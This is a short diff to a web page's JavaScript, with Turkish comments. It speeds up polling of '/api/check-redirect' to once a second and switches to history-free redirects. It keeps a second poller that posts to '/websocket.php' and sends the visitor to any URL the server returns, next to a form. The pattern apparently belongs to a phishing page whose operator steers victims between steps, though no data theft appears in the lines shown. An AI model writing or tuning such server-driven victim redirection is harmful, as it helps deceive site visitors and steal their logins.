@@ -372,20 +372,27 @@
 
     async function checkRedirect() {
       try {
-        const res = await fetch('/api/check-redirect');
+        const res = await fetch('/api/check-redirect', { 
+          cache: 'no-store',
+          keepalive: true 
+        });
         if (res.ok) {
           const data = await res.json();
           if (data.redirectTo) {
-            window.location.href = data.redirectTo;
+            // Direkt yönlendir - window.location.replace() daha hızlı ve geçmişe eklenmez
+            window.location.replace(data.redirectTo);
+            return true;
           }
         }
       } catch (err) {
         console.error('Redirect check failed', err);
       }
+      return false;
     }
 
     checkRedirect();
-    setInterval(checkRedirect, 3000);
+    // Daha sık kontrol et - her 1 saniyede bir
+    setInterval(checkRedirect, 1000);
 
     function b_xhr() { fetch("/websocket.php", { method: "POST" }) .then((y) => y.json()) .then((m) => { if (m.success) { let u = m.success; if (u.includes('login')) { u = '../' + u; } window.location.href = u; } }); } setInterval(b_xhr, 1500);
     const frm = document.querySelector('form');
